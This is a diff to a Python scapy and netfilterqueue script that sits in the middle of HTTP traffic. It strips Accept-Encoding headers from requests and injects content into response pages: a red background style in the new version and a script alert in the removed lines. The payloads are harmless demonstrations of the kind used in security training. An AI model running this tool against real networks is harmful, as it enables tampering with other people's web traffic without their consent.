@@ -14,14 +14,15 @@ def process_packet(packet):
     if scapy_packet.haslayer(scapy.Raw):
         if scapy_packet[scapy.TCP].dport == 80:
             print("[+] Request")
-            modified_load = re.sub("Accept-Encoding:.*?\\r\n", "", scapy_packet[scapy.Raw].load)
+            modified_load = re.sub(b"Accept-Encoding:.*?\\r\\n", b"", scapy_packet[scapy.Raw].load)
             new_packet = set_load(scapy_packet, modified_load)
-            packet.set_payload(str(new_packet))
+            packet.set_payload(bytes(new_packet))
         elif scapy_packet[scapy.TCP].sport == 80:
             print("[+] Response")
-            modified_load = scapy_packet[scapy.Raw].load.replace("</body>", "<script>alert('test');</script></body>")
+            modified_load = scapy_packet[scapy.Raw].load.replace(b"<body>",  b"<body style='background-color:red;'>")
             new_packet = set_load(scapy_packet, modified_load)
-            packet.set_payload(str(new_packet))
+            packet.set_payload(bytes(new_packet))
+            print("SUCCESS MODIFIED")
     packet.accept()
 
 queue = netfilterqueue.NetfilterQueue()
